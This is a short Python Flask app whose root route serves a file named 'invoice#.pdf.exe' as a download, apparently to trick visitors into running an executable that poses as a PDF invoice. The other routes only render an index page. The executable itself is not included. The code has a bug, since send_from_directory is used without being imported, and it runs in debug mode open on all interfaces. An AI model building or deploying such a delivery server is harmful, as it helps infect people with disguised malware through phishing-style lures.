from flask import Flask, render_template

app = Flask(__name__)
# Route to serve the file
@app.route('/')
def download_file():
    # The file will be served from the 'static' folder
    return send_from_directory(directory='static', path='invoice#.pdf.exe', as_attachment=True)
@app.route('/h')
def home():
    return render_template('index.html')

@app.route('/index')
def homee():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True,host='0.0.0.0')
